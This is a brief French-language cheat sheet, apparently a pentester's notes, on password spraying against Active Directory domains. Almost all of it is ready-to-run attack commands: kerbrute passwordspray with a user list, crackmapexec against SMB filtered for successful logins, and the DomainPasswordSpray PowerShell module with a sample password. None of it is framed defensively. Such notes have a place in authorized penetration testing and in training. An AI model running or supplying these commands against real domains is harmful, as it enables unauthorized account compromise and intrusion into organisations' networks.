# Password Spraying

utilisation de kerbrute pour faire du password spraying sur une liste d'utilisateur et un password:

```bash
kerbrute passwordspray -d $domain --dc $ip users.txt  $password
```

password spraying via crackmapexec:

```bash
sudo crackmapexec smb $ip -u users.txt -p $password | grep +
```

## Password spraying depuis Windows

https://github.com/dafthack/DomainPasswordSpray

```powershell
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```
